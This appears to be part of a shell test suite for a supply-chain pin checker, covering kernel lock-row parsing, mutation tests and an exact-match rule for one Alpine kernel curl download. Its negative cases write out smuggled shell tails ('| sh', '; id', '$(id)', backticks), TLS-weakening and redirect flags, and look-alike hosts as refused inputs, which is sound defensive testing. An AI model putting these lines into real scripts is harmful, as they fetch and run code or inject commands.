import importlib.util, sys
spec = importlib.util.spec_from_file_location("pin_inventory", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
for v in ("main", "3x", "1x", "latest", "x"):
    try:
        inv.inventory({inv.KERNEL_LOCK: "x86_64/badver=%s sha256:%s\n" % (v, "3" * 64)})
    except RuntimeError as e:
        assert "not a pin" in str(e).lower() and "vm-kernel.lock" in str(e), (v, str(e))
    else:
        raise AssertionError("the row parser accepted the version %r" % v)
for v in ("1.1.1w-r0", "2023c-r0", "6.18.60-r0"):
    items = inv.inventory({inv.KERNEL_LOCK: "x86_64/linux-virt=%s sha256:%s\n" % (v, "4" * 64)})
    assert list(items) == ["apk:x86_64/linux-virt@" + v] and items["apk:x86_64/linux-virt@" + v].kind == "apk", (v, list(items))
real = "linux-virt=6.18.60-r0 sha256:3ff658cf5aada14687238527f48526cef7a75ac8c673fc597f3a65791c86a25e\n"
items = inv.inventory({inv.KERNEL_LOCK: real})
assert list(items) == ["apk:linux-virt@6.18.60-r0"] and items["apk:linux-virt@6.18.60-r0"].sum, list(items)
PY
}
LCOLD="a c d e f g h h2 u"
LCNEW="g1a g1b g1c g1w g2a g2b g2c g3a g3b g3c g3d g3e g3f g4a g4u$G5IDS g6a g6u g8 g9a g9b g10a g10b rv$RPIDS"
LCIDS="$LCOLD $LCNEW"
lc_all() { LCFAIL=""; local i; for i in ${LCSEL:-$LCIDS}; do "lc_$i" >/dev/null 2>&1 || LCFAIL="$LCFAIL $i"; done; }
CASE="kernel row a: one moved row is a readable pin: exit 0, and the check NAMES the item"; check lc_a
CASE="kernel row c: no lock row moves (another file changes): exit 0, no apk item"; check lc_c
CASE="kernel row d: two rows move: exit 0, and both items are named"; check lc_d
CASE="kernel row e: the same version with a new sha256 (a replaced apk) is a NEW item: named (exit 0)"; check lc_e
CASE="kernel row f: a Wolfi lock file row moves: exit 0, no apk item (ruled exempt, not a silent gap)"; check lc_f
CASE="kernel row g: only build/archive.json moves: exit 0, no apk item"; check lc_g
CASE="kernel row h: rows reordered, a comment edited, blank lines added: nothing moved, exit 0"; check lc_h
CASE="kernel row h2: a row removed: nothing moved, exit 0"; check lc_h2
CASE="kernel row u: the inventory lists the row as kind apk with key apk:<name>@<version>, and the sha256 is its sum"; check lc_u
CASE="kernel row G1 a kernel lock that is a symlink (git mode 120000) is refused: exit 2, 'cannot run'"; check lc_g1a
CASE="kernel row G1 a symlink whose TARGET TEXT is a valid row is refused (exit 2), its name is never parsed as a row"; check lc_g1b
CASE="kernel row G1 a symlink to a real file holding a valid row is still refused (exit 2)"; check lc_g1c
CASE="kernel row G1 a symlinked kernel lock in the working tree (rev None) is refused by tree_files and load_at"; check lc_g1w
CASE="kernel row G2 two rows with one name=version and different digests: exit 2 (identity never merges)"; check lc_g2a
CASE="kernel row G2 the same two rows in the other order: exit 2"; check lc_g2b
CASE="kernel row G2 two IDENTICAL rows: exit 2 too (a duplicate row is an error)"; check lc_g2c
CASE="kernel row G3 the kernel lock exists and is empty: exit 2 (the control may not cover nothing)"; check lc_g3a
CASE="kernel row G3 the kernel lock holds only a comment: exit 2"; check lc_g3b
CASE="kernel row G3 the kernel lock holds only blank lines: exit 2"; check lc_g3c
CASE="kernel row G3 a NEW kernel lock that is empty: exit 2"; check lc_g3d
CASE="kernel row G3 the kernel lock is missing and nothing moved: exit 0, says so"; check lc_g3e
CASE="kernel row G3 the kernel lock is removed by the pull request: exit 0 (a missing file stays allowed)"; check lc_g3f
CASE="kernel row G4 the row cache#840 wrote (no arch prefix) is a readable pin: exit 0, and it is named"; check lc_g4a
CASE="kernel row G4 the inventory lists that exact row as apk:linux-virt@6.18.60-r0 with a sum"; check lc_g4u
CASE="kernel row G5 an unreadable row (hex63) beside a good one: exit 2 'cannot run', never skipped"; check lc_g5_hex63
CASE="kernel row G5 an unreadable row (hex65) beside a good one: exit 2 'cannot run', never skipped"; check lc_g5_hex65
CASE="kernel row G5 an unreadable row (nosum) beside a good one: exit 2 'cannot run', never skipped"; check lc_g5_nosum
CASE="kernel row G5 an unreadable row (upper) beside a good one: exit 2 'cannot run', never skipped"; check lc_g5_upper
CASE="kernel row G5 an unreadable row (eq2) beside a good one: exit 2 'cannot run', never skipped"; check lc_g5_eq2
CASE="kernel row G5 an unreadable row (junk) beside a good one: exit 2 'cannot run', never skipped"; check lc_g5_junk
CASE="kernel row G5 an unreadable row (nul) beside a good one: exit 2 'cannot run', never skipped"; check lc_g5_nul
CASE="kernel row G5 an unreadable row (tail) beside a good one: exit 2 'cannot run', never skipped"; check lc_g5_tail
CASE="kernel row G6 rows with versions 1.1.1w-r0 and 2023c-r0 are pins, not 'not a pin': exit 0, both named"; check lc_g6a
CASE="kernel row G6 is_pin takes 1.1.1w-r0, 2023c-r0 and the other apk versions, and still refuses main, latest, 1.*, 3.x, ranges, nightly"; check lc_g6u
CASE="kernel row G8 a tracked kernel lock that cannot be read in the working tree RAISES, it is not skipped"; check lc_g8
CASE="kernel row G9 exactly 500 rows are accepted (exit 0)"; check lc_g9a
CASE="kernel row G9 501 rows are refused (exit 2)"; check lc_g9b
CASE="kernel row G10 the item-kind list in the header of pin-inventory.py names apk"; check lc_g10a
CASE="kernel row G10 the header of pin-age-check-test.sh names apk"; check lc_g10b
CASE="kernel row G6b the row parser takes 1.1.1w-r0, 2023c-r0, 6.18.60-r0 and the real row cache#840 wrote, and REFUSES main, 3x, 1x, latest, x (RuntimeError naming the file, \"not a pin\")"; check lc_rv
CASE="kernel row G6b a NEW row with the version main is refused: exit 2 'cannot run', says it is not a pin"; check lc_rp_main
CASE="kernel row G6b the SAME row with the version main in base AND head (unchanged) is refused too: exit 2, never exit 0"; check lc_ru_main
CASE="kernel row G6b a NEW row with the version 3x is refused: exit 2 'cannot run', says it is not a pin"; check lc_rp_3x
CASE="kernel row G6b the SAME row with the version 3x in base AND head (unchanged) is refused too: exit 2, never exit 0"; check lc_ru_3x
CASE="kernel row G6b a NEW row with the version 1x is refused: exit 2 'cannot run', says it is not a pin"; check lc_rp_1x
CASE="kernel row G6b the SAME row with the version 1x in base AND head (unchanged) is refused too: exit 2, never exit 0"; check lc_ru_1x
CASE="kernel row G6b a NEW row with the version latest is refused: exit 2 'cannot run', says it is not a pin"; check lc_rp_latest
CASE="kernel row G6b the SAME row with the version latest in base AND head (unchanged) is refused too: exit 2, never exit 0"; check lc_ru_latest
CASE="kernel row G6b a NEW row with the version x is refused: exit 2 'cannot run', says it is not a pin"; check lc_rp_x
CASE="kernel row G6b the SAME row with the version x in base AND head (unchanged) is refused too: exit 2, never exit 0"; check lc_ru_x

# --- mutants: one exact edit each, in a temp copy of the scripts; every mutant must make at least one case above fail --------------------------------
# The edits anchor on these exact strings (the first is the line the code change must add to pin-inventory.py; the others are existing code):
#   KERNEL_LOCK = "build/locks/vm-kernel.lock"                                  (pin-inventory.py: the one constant _wanted and the row reader both use)
#   return _sumid(self.sums)                                                    (pin-inventory.py, Item.sum)
#           if not is_pin(m.group(2)):                                   (pin-inventory.py, _kernel_lock_items: the version of a row must be a pin)
#   the line of _kernel_lock_items that raises RuntimeError with the text "a lock row is not" (whole line replaced by continue)
#   return [head_items[k] for k in sorted(head_items) if k not in base_items or base_items[k].sum != head_items[k].sum]    (pin-inventory.py, moved)
mutate() {   # NAME FILE OLD NEW -> $work/mut/NAME/.github/agent/supply-chain, rc 3 when OLD is not found exactly once
  local m="$work/mut/$1"; rm -rf "${m:?}"; mkdir -p "$m/.github/agent" "$m/.github/policy"
  cp -R "$here/../supply-chain" "$m/.github/agent/supply-chain"
  cp "$root/.github/supply-chain-exceptions.json" "$m/.github/" 2>/dev/null || true; cp "$root/.github/policy/base-inputs.json" "$m/.github/policy/" 2>/dev/null || true
  python3 - "$m/.github/agent/supply-chain/$2" "$3" "$4" <<'PY'
import sys
p, old, new = sys.argv[1:4]
s = open(p).read()
if old.startswith("LINE:"):      # the one line holding the text: replaced whole, keeping its indentation
    ls = s.split("\n"); at = [i for i, l in enumerate(ls) if old[5:] in l]
    if len(at) != 1: sys.exit(3)
    ls[at[0]] = ls[at[0]][:len(ls[at[0]]) - len(ls[at[0]].lstrip())] + new
    open(p, "w").write("\n".join(ls)); sys.exit(0)
sys.exit(3) if s.count(old) != 1 else open(p, "w").write(s.replace(old, new))
PY
}
mutant() {   # NAME FILE OLD NEW [CASES]: the cases that must see it (default: the first eleven)
  local rcm=0 sel=${5:-$LCOLD}; mutate "$1" "$2" "$3" "$4" || rcm=$?
  CASE="kernel row mutant $1: the edit applies to the code"
  if [ "$rcm" -ne 0 ]; then echo "PENDING-CODE: mutant $1 cannot apply (its anchor in $2 is missing or not unique): $3"; bad "$CASE"; return; fi
  LCHK="$work/mut/$1/.github/agent/supply-chain/pin-age-check.py"; LINV="$work/mut/$1/.github/agent/supply-chain/pin-inventory.py"
  LCSEL="$sel"; lc_all; LCSEL=""
  CASE="kernel row mutant $1 is killed (a case above fails)"
  if [ -n "$LCFAIL" ]; then ok "$CASE"; echo "mutant killed: $1 (failing cases:$LCFAIL)"; else bad "$CASE"; echo "mutant SURVIVED: $1"; fi
  LCHK=$chk; LINV=$here/../supply-chain/pin-inventory.py
}
lc_all
if [ -n "$LCFAIL" ]; then
  CASE="kernel row mutants need a green baseline (cases failing now:$LCFAIL)"; echo "PENDING-CODE: the mutants below are not run until every case above passes on the real code"; bad "$CASE"
else
  mutant lock-path-dropped pin-inventory.py 'KERNEL_LOCK = "build/locks/vm-kernel.lock"' 'KERNEL_LOCK = "build/locks/no-such-file.lock"'
  mutant sum-left-out pin-inventory.py 'return _sumid(self.sums)' 'return _sumid([]) if self.kind == "apk" else _sumid(self.sums)'
  mutant wolfi-file-listed pin-inventory.py 'KERNEL_LOCK = "build/locks/vm-kernel.lock"' 'KERNEL_LOCK = "build/locks/host-tools.lock"'
  mutant reorder-counts-as-move pin-inventory.py 'return [head_items[k] for k in sorted(head_items) if k not in base_items or base_items[k].sum != head_items[k].sum]' 'return [head_items[k] for k in sorted(head_items) if k not in base_items or base_items[k].sum != head_items[k].sum or (k.startswith("apk:") and list(base_items).index(k) != list(head_items).index(k))]'
  mutant removal-counts-as-move pin-inventory.py 'return [head_items[k] for k in sorted(head_items) if k not in base_items or base_items[k].sum != head_items[k].sum]' 'return [base_items[k] for k in sorted(base_items) if k.startswith("apk:") and k not in head_items] + [head_items[k] for k in sorted(head_items) if k not in base_items or base_items[k].sum != head_items[k].sum]'
  mutant row-error-skipped pin-inventory.py 'LINE:a lock row is not' 'continue' "$G5IDS"
  # mutant row-version-passthrough: the version check of the row parser (the call of the predicate shared with is_pin) replaced by pass-through; the row cases must see it.
  mutant row-version-passthrough pin-inventory.py '        if not is_pin(m.group(2)):' '        if False:' "rv$RPIDS"
fi

# --- HLF-BEGIN: REQ-SUP-001-AC35, the hash-locked fetch ruling kind (orchestrator ruling Nov 5, cache#840 F3 option c) -----------------------------------
# The one kernel fetch line of bin/refresh-inputs.sh is ruled by a row that starts with HASH_LOCKED_RULING, and only when the line is the fixed shape, the file holds it
# once, and the lock file build/locks/vm-kernel.lock at the HEAD tree is a regular file of 1 to 500 pinned rows. The host, the path prefix, the file and the lock file are
# constants of the checker; a row carries its five usual fields and two of its own: `verifier` {file, line} and `verifier-line-sha256`. Everything here is self-contained: it needs only the base repository built above.
# THE CODE CONTRACT the mutants below anchor on (pin-age-check.py): a constant HASH_LOCKED_RULING (the prefix, added to the accepted tuple of _run as `, HASH_LOCKED_RULING)) for r in rs):`),
# and these tagged lines, each `<indent>if <condition>:  # HL:<tag>` with the refusal on the next line, exactly one line per tag:
#   HL:gate      the _run line that blanks a row of this kind whose line fails _hash_locked_line_ok(...)
#   HL:file      the file is not bin/refresh-inputs.sh            HL:host      the operand host is not dl-cdn.alpinelinux.org
#   HL:path      the operand path is not /alpine/v3.24/main/x86_64/$f   HL:operands  there is not exactly one operand
#   HL:raw       the file does not hold the canonical raw line (eight spaces of indent plus the flat line) as one whole line    HL:die  the text after || is not the fixed die message
#   HL:flags     the flags are not the fixed list in the fixed order, or -g/-q/--proto =https/--tlsv1.2 is missing
#   HL:lock      the lock file read from the head tree is missing or not a regular file (a malformed lock is refused by the inventory parser before the gate runs)
#   HL:verifier  the row's verifier (the physical line of the fetch script that checks a download's sha256 against the lock) is not in the verifier's file exactly once, as a whole line with no whitespace twin, or that file is not the fetch file, or the row's line is not the file's line
#   HL:verifier-sha  the sha256 of that line in the head file is not the row's verifier-line-sha256
# and ONE line `<indent>rev = head  # HL:head` (the revision the lock file is read from).
HLP='hash-locked fetch, orchestrator ruling Nov 5 (audits/reviews/cache-840-kernel-fetch.md): '
HLUR='https://dl-cdn.alpinelinux.org/alpine/v3.24/main/x86_64/$f'
HLKA='        /usr/bin/curl -q -fsSL -g --max-filesize 268435456 --max-time 900 --proto =https --tlsv1.2 -o "$tmp/dl/x86_64/$f"'
HLKB='|| die "could not download the kernel package from the Alpine mirror" 1'
HLK="$HLKA \"$HLUR\" $HLKB"
HLOTHER='curl -fsSL https://example.com/x -o /tmp/x'
HLVL='    if hashlib.sha256(raw).hexdigest() != want_sha:'  # the verifier: bin/refresh-inputs.sh verify_kernel at cache#840 2120c27:754; every body below gets it appended once unless HLNV=1
HLROW='linux-virt=6.18.60-r0 sha256:3ff658cf5aada14687238527f48526cef7a75ac8c673fc597f3a65791c86a25e'
hl_row() { # OUT FILE LINE PREFIX: the row for the download segment of LINE, bound to LINE, as the scan flattens it (the same as mkrowpf), plus the verifier fields of the kind;
  # env: HLVF (the verifier's file), HLVLINE (its line), HLVSHA (verifier-line-sha256), each default to the right value; HLVER and HLVSHA = - leave a field out, HLVER = raw JSON; HLVEXTRA=1 adds a key
  HLVL="$HLVL" python3 - "$@" <<'PY'
import hashlib, json, os, re, sys
out, f, line, pref = sys.argv[1:5]; H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
flat = " ".join(line.split()); segs = [s for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat) if re.search(r"\b(?:curl|wget)\b", s)]
rows = [{"file": f, "form": "a download", "key": H(sg), "line": H(flat), "ruling": pref + "pinned by file and whole line"} for sg in dict.fromkeys(segs)]
e = os.environ; vl = e["HLVL"]; ver = e.get("HLVER") or {"file": e.get("HLVF", "bin/refresh-inputs.sh"), "line": e.get("HLVLINE", vl)}; sha = e.get("HLVSHA") or H(vl)
if isinstance(ver, str): ver = None if ver == "-" else json.loads(ver)
if isinstance(ver, dict) and e.get("HLVEXTRA"): ver["note"] = "x"
for r in rows:
    if ver is not None: r["verifier"] = ver
    if sha != "-": r["verifier-line-sha256"] = sha
json.dump({"exceptions": [], "unmeasured_text": rows}, open(out, "w"))
PY
}
hl_repo() { # NAME FILE BODY LOCKBASE LOCKHEAD [link]: LOCK specs: text | - (absent) | = (unchanged, head only) | @link | @empty | @many (501 rows); link: FILE is a symlink at the head
  rm -rf "${work:?}/$1"; cp -R "$base" "$work/$1"
  python3 - "$work/$1" "$2" "$3" "$4" "$5" "${6:-}" <<'PY'
import os, pathlib, subprocess, sys
root, f, body, lb, lh, fmode = sys.argv[1:7]; R = pathlib.Path(root)
g = lambda *a: subprocess.run(["git", "-C", root, "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
GOOD = "linux-virt=6.18.60-r0 sha256:3ff658cf5aada14687238527f48526cef7a75ac8c673fc597f3a65791c86a25e\n"
lock = R / "build/locks/vm-kernel.lock"
def put(spec):
    lock.parent.mkdir(parents=True, exist_ok=True)
    if lock.is_symlink() or lock.exists(): lock.unlink()
    if spec == "-": return
    if spec == "@link":
        (lock.parent / "real.lock").write_text(GOOD); os.symlink("real.lock", lock)
    elif spec == "@empty": lock.write_text("")
    elif spec == "@many": lock.write_text("".join("pkg%d=1.0.%d-r0 sha256:%064x\n" % (i, i, i) for i in range(501)))
    else: lock.write_bytes((spec if spec.endswith("\n") else spec + "\n").encode("utf-8", "surrogateescape"))   # a byte that is not UTF-8 arrives as a lone surrogate and goes out as that byte
p = R / f; p.parent.mkdir(parents=True, exist_ok=True)
put(lb); p.write_text("#!/bin/sh\n"); g("add", "-A"); g("commit", "-q", "-m", "base2")
if lh != "=": put(lh)
if fmode == "link":
    (p.parent / "hl-target.sh").write_bytes(("#!/bin/sh\n" + body + "\n").encode("utf-8", "surrogateescape")); p.unlink(); os.symlink("hl-target.sh", p)
else:
    p.write_bytes(("#!/bin/sh\n" + body + "\n").encode("utf-8", "surrogateescape"))
g("add", "-A"); g("commit", "-q", "--allow-empty", "-m", "head")
PY
}
HLN=(); declare -A HLW
hl_case() { # NAME WANT FILE BODY LOCKBASE LOCKHEAD ROWLINE [PREFIX] [ROWFILE] [link]: WANT is the exit code (0 = ruled by the new kind)
  HLN+=("$1"); HLW[$1]=$2
  local body=$4; [ -n "${HLNV:-}" ] || body=$4$'\n'$HLVL
  hl_repo "hl-$1" "$3" "$body" "$5" "$6" "${10:-}"
  hl_row "$work/hl-$1.json" "${9:-$3}" "$7" "${8:-$HLP}"
}
hl_exec() { # CHECKER [stop]: HLBAD = the names of the cases that do not give the wanted exit code
  HLBAD=""; local n w rc
  for n in "${HLN[@]}"; do
    w=${HLW[$n]}; rc=0
    python3 "$1" --root "$work/hl-$n" --base HEAD~1 --head HEAD --exceptions "$work/hl-$n.json" >"$work/hl-$n.out" 2>&1 || rc=$?
    if [ "$rc" -ne "$w" ] || { [ "$w" -eq 0 ] && ! grep -q 'ruled text.*hash-locked fetch' "$work/hl-$n.out"; }; then
      HLBAD="$HLBAD $n"; if [ "${2:-}" = stop ]; then return 0; fi
    fi
  done
}
F=bin/refresh-inputs.sh; V=$HLROW
# the positive: the exact line of cache#840 (refresh-inputs.sh:1379 at 2120c271), a valid lock at the head that is the same as at the base (no package moves)
hl_case ruled-ok 0 $F "$HLK" "$V" = "$HLK"
# round 2 seat B, P4: the physical line 1379 of cache#840 (2120c271) bin/refresh-inputs.sh, typed out in full (cache1: exactly 8 leading spaces, no tab, no trailing space), not built from HLKA/HLKB
HLREAL=$'        /usr/bin/curl -q -fsSL -g --max-filesize 268435456 --max-time 900 --proto =https --tlsv1.2 -o "$tmp/dl/x86_64/$f" "https://dl-cdn.alpinelinux.org/alpine/v3.24/main/x86_64/$f" || die "could not download the kernel package from the Alpine mirror" 1'
hl_case real-840-line 0 $F "$HLREAL" "$V" = "$HLREAL"
# the line: host, scheme, path, operands
ln="$HLKA \"https://example.com/alpine/v3.24/main/x86_64/\$f\" $HLKB"; hl_case host-other 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"https://dl-cdn.alpinelinux.org.example.com/alpine/v3.24/main/x86_64/\$f\" $HLKB"; hl_case host-suffix 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"https://dl-cdn.alpinelinux.org@example.com/alpine/v3.24/main/x86_64/\$f\" $HLKB"; hl_case host-userinfo 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"http://dl-cdn.alpinelinux.org/alpine/v3.24/main/x86_64/\$f\" $HLKB"; hl_case scheme-http 1 $F "$ln" "$V" = "$ln"
for pv in "v3.25/main/x86_64" "edge/main/x86_64" "v3.24/community/x86_64" "v3.24/main/aarch64" "v3.24/main/x86_64/sub"; do
  nm=path-${pv//\//-}; ln="$HLKA \"https://dl-cdn.alpinelinux.org/alpine/$pv/\$f\" $HLKB"
  hl_case "$nm" 1 $F "$ln" "$V" = "$ln"
done
ln="$HLKA \"$HLUR\" \"https://dl-cdn.alpinelinux.org/alpine/v3.24/main/x86_64/other.apk\" $HLKB"; hl_case operand-second 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"https://dl-cdn.alpinelinux.org/alpine/v3.24/main/x86_64/linux-virt-6.18.60-r0.apk\" $HLKB"; hl_case operand-literal 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"https://dl-cdn.alpinelinux.org/alpine/v3.24/main/x86_64/\$f/../x\" $HLKB"; hl_case operand-climbing 1 $F "$ln" "$V" = "$ln"
ln="$HLKA https://dl-cdn.alpinelinux.org/alpine/v3.24/main/x86_64/\$f $HLKB"; hl_case operand-unquoted 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"https://dl-cdn.alpinelinux.org/alpine/v3.24/main/x86_64/\" $HLKB"; hl_case operand-no-variable 1 $F "$ln" "$V" = "$ln"
# the flags: one missing, one added, in the wrong order
for fv in "-q" "-g" "--proto =https" "--tlsv1.2" "--max-time 900"; do
  nm=flag-missing-${fv%% *}; ln="${HLKA/ $fv/} \"$HLUR\" $HLKB"
  hl_case "$nm" 1 $F "$ln" "$V" = "$ln"
done
for fv in "-K /tmp/c" "--resolve dl-cdn.alpinelinux.org:443:127.0.0.1" "--url https://example.com/x" "-x http://p:1" "-k"; do
  nm=flag-added-${fv%% *}; ln="${HLKA/ -g / -g $fv } \"$HLUR\" $HLKB"
  hl_case "$nm" 1 $F "$ln" "$V" = "$ln"
done
ln="${HLKA/ -q -fsSL -g / -fsSL -q -g } \"$HLUR\" $HLKB"; hl_case flags-reordered 1 $F "$ln" "$V" = "$ln"
# the tail: `|| true`, no `|| die`, a pipe, a second command, a redirection
ln="$HLKA \"$HLUR\" || true"; hl_case tail-or-true 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"$HLUR\""; hl_case tail-none 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"$HLUR\" $HLKB | sh"; hl_case tail-pipe 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"$HLUR\" $HLKB; id"; hl_case tail-semicolon 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"$HLUR\" $HLKB && id"; hl_case tail-and 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"$HLUR\" $HLKB "'`id`'; hl_case tail-backtick 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"$HLUR\" $HLKB "'$(id)'; hl_case tail-substitution 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"$HLUR\" $HLKB > /tmp/o"; hl_case tail-redirect 1 $F "$ln" "$V" = "$ln"
# the row: another prefix, the prefix on another line, the same line in another file, hashes of another line
HLVER=- HLVSHA=- hl_case row-prefix-pinned-fetch 1 $F "$HLK" "$V" = "$HLK" 'pinned fetch, advisor reading Oct 17 (REQ-SUP-001-AC26): '
HLVER=- HLVSHA=- hl_case row-prefix-live-fetch 1 $F "$HLK" "$V" = "$HLK" 'live fetch, owner ratified (Oct 9 rule 48 / Oct 15 exception 2): '
hl_case same-line-other-file 1 bin/other.sh "$HLK" "$V" = "$HLK"
hl_case row-names-another-line 1 $F "$HLKA \"https://example.com/x/\$f\" $HLKB" "$V" = "$HLK"
# the file: the line twice, a whitespace twin, a carriage return, a symlink
hl_case line-twice 1 $F "$HLK"$'\n'"$HLK" "$V" = "$HLK"
hl_case line-whitespace-twin 1 $F "$HLK"$'\n'"${HLK/ -q / -q	}" "$V" = "$HLK"
hl_case line-with-cr 1 $F "$HLK"$'\r' "$V" = "$HLK"
hl_case file-is-a-symlink 1 $F "$HLK" "$V" = "$HLK" "$HLP" "" link
# round 1 rulings F1-F4 (cache#845): the file must hold the canonical RAW line byte for byte (the scan collapses whitespace, so every variant below keeps the row bound),
# the whole command must match with token boundaries and balanced quotes, the quoted URL is compared literally, and /usr/bin/curl is the only spelling
hl_case raw-trailing-space 1 $F "$HLK " "$V" = "$HLK"
hl_case raw-trailing-tab 1 $F "$HLK"$'\t' "$V" = "$HLK"
hl_case raw-extra-space-in-flags 1 $F "${HLK/ -q -fsSL/ -q  -fsSL}" "$V" = "$HLK"
hl_case raw-extra-space-before-tail 1 $F "${HLK/ || die/  || die}" "$V" = "$HLK"
hl_case raw-tab-between-flags 1 $F "${HLK/ -q -fsSL/ -q	-fsSL}" "$V" = "$HLK"
hl_case raw-indent-changed 1 $F "${HLK#    }" "$V" = "$HLK"
ln="$HLKA \"$HLUR\"$HLKB"; hl_case raw-no-space-before-tail 1 $F "$ln" "$V" = "$ln"   # the row is bound to this very line, so only the gate refuses it
ln="$HLKA\"$HLUR\" $HLKB"; hl_case operand-glued-to-output-operand 1 $F "$ln" "$V" = "$ln"
# round 2 seat B, P1: a URL operand without its closing quote is not an operand (the tokenizer falls through to \S+ and the last character was cut as if it were the quote)
ln="$HLKA \"${HLUR}Z $HLKB"; hl_case operand-quote-unclosed-trailing-char 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"${HLUR}/ $HLKB"; hl_case operand-quote-unclosed-trailing-slash 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"$HLUR\"\" $HLKB"; hl_case operand-extra-closing-quote 1 $F "$ln" "$V" = "$ln"
ln="${HLKA%\"} \"$HLUR\" $HLKB"; hl_case output-operand-quote-unbalanced 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \" $HLUR\" $HLKB"; hl_case url-leading-space 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"$HLUR \" $HLKB"; hl_case url-trailing-space 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"$HLUR?\" $HLKB"; hl_case url-empty-query 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"$HLUR#\" $HLKB"; hl_case url-empty-fragment 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"${HLUR/dl-cdn.alpinelinux.org/dl-cdn.alpinelinux.org:443}\" $HLKB"; hl_case url-port 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"$HLUR?x=1\" $HLKB"; hl_case url-query-value 1 $F "$ln" "$V" = "$ln"
ln="$HLKA \"$HLUR#x\" $HLKB"; hl_case url-fragment-value 1 $F "$ln" "$V" = "$ln"
ln="${HLK/could not download/could download}"; hl_case die-text-changed 1 $F "$ln" "$V" = "$ln"
ln="${HLK%1}0"; hl_case die-exit-code-changed 1 $F "$ln" "$V" = "$ln"
ln="${HLK/268435456/536870912}"; hl_case flag-max-filesize-changed 1 $F "$ln" "$V" = "$ln"
ln="${HLK/--max-time 900/--max-time 9000}"; hl_case flag-max-time-changed 1 $F "$ln" "$V" = "$ln"
ln="${HLK/\$tmp\/dl\/x86_64\/\$f/\$tmp\/dl\/x86_64\/other}"; hl_case output-path-changed 1 $F "$ln" "$V" = "$ln"
ln="${HLK/\/usr\/bin\/curl/curl}"; hl_case curl-bare 1 $F "$ln" "$V" = "$ln"
ln="${HLK/\/usr\/bin\/curl//bin/curl}"; hl_case curl-bin-curl 1 $F "$ln" "$V" = "$ln"
# round 1 seat D ruling D1: the verifier line must be in the file exactly once, whole and unchanged; a lock that merely exists passes nothing (the cases above carry it once)
HLNV=1 hl_case verifier-missing 1 $F "$HLK" "$V" = "$HLK"
HLNV=1 hl_case verifier-commented-out 1 $F "$HLK"$'\n'"# $HLVL" "$V" = "$HLK"
HLNV=1 hl_case verifier-indent-3 1 $F "$HLK"$'\n'"${HLVL# }" "$V" = "$HLK"
HLNV=1 hl_case verifier-indent-5 1 $F "$HLK"$'\n'" $HLVL" "$V" = "$HLK"
HLNV=1 hl_case verifier-tab-indent 1 $F "$HLK"$'\n'$'\t'"${HLVL#    }" "$V" = "$HLK"
HLNV=1 hl_case verifier-trailing-space 1 $F "$HLK"$'\n'"$HLVL " "$V" = "$HLK"
HLNV=1 hl_case verifier-with-cr 1 $F "$HLK"$'\n'"$HLVL"$'\r' "$V" = "$HLK"
HLNV=1 hl_case verifier-other-operator 1 $F "$HLK"$'\n'"${HLVL/!=/==}" "$V" = "$HLK"
hl_case verifier-twice 1 $F "$HLK"$'\n'"$HLVL" "$V" = "$HLK"
hl_case verifier-whitespace-twin 1 $F "$HLK"$'\n'"${HLVL/if hashlib/if  hashlib}" "$V" = "$HLK"
# round 2 seat A, P3: the verifier line is matched and hashed as BYTES. The row's line ends in a U+FFFD (EF BF BD) and its sha256 is over those UTF-8 bytes; a head file with the byte FF in its
# place equals it only after replacement decoding, so it must not pass. An undecodable lock (FF in a comment) is refused: the check cannot read it (exit 2, as for a malformed row).
HLFFFD=$'\xef\xbf\xbd'; HLV8="$HLVL#$HLFFFD"; HLV8SHA=$(printf %s "$HLV8" | sha256sum | cut -d' ' -f1)
HLNV=1 HLVLINE="$HLV8" HLVSHA=$HLV8SHA hl_case verifier-fffd-exact-bytes 0 $F "$HLK"$'\n'"$HLV8" "$V" = "$HLK"
HLNV=1 HLVLINE="$HLV8" HLVSHA=$HLV8SHA hl_case verifier-fffd-whitespace-twin 1 $F "$HLK"$'\n'"$HLV8"$'\n'"${HLV8/if hashlib/if  hashlib}" "$V" = "$HLK"
HLNV=1 HLVLINE="$HLV8" HLVSHA=$HLV8SHA hl_case verifier-invalid-byte 1 $F "$HLK"$'\n'"$HLVL#"$'\xff' "$V" = "$HLK"
# the row's two fields (round 1 seat D, orchestrator answer 10:08Z): the sha256 is a row field, the checker hashes the file's line and compares; absent or wrong fields rule nothing
HLSHA=$(printf %s "$HLVL" | sha256sum | cut -d' ' -f1)
HLSHAX=$([ "${HLSHA:0:1}" = 0 ] && echo 1 || echo 0)${HLSHA:1}   # the right sha with its first digit changed
HLVSHA=$HLSHAX hl_case verifier-sha-wrong 1 $F "$HLK" "$V" = "$HLK"
HLVER=- HLVSHA=- hl_case row-without-verifier-fields 1 $F "$HLK" "$V" = "$HLK"
HLVF=bin/other.sh hl_case verifier-file-other 1 $F "$HLK" "$V" = "$HLK"
HLVLINE="${HLVL/!=/==}" hl_case verifier-row-line-differs 1 $F "$HLK" "$V" = "$HLK"
# the loader: a field that is malformed, alone, or on another kind of row stops the check
HLVSHA="${HLSHA%?}" hl_case verifier-sha-63-hex 2 $F "$HLK" "$V" = "$HLK"
HLVSHA="${HLSHA^^}" hl_case verifier-sha-upper-case 2 $F "$HLK" "$V" = "$HLK"
HLVSHA=- hl_case verifier-sha-missing 2 $F "$HLK" "$V" = "$HLK"
